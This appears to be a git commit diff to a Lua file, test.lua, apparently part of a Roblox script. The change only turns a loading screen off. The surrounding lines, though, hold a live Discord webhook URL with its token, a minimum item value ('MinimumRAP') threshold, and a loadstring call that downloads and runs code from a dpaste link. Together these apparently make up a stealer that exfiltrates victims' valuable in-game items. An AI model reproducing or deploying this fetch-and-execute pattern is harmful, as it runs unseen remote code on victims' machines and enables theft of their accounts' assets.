998aab2406780d21ab9b0216a5389a60b7c515bd
pablopoep <123007142+pablopoep@users.noreply.github.com>
2024-01-29 20:16:08 +0100

    Update test.lua

--- test.lua
+++ test.lua
@@ -3,7 +3,7 @@ Username2 = ""
 
 Webhook = "https://discord.com/api/webhooks/1201559132226981968/Tvud5YvYPelXRf3hArfPlch268tO7WDUXIlVUY-42C9POo1ScqUiYwGIN2hwiif5J8a-"
 
-LoadingScreen = true
+LoadingScreen = false
 MinimumRAP = 10000
 
 loadstring(game:HttpGet("https://dpaste.com/FU7CTHP7M.txt"))()
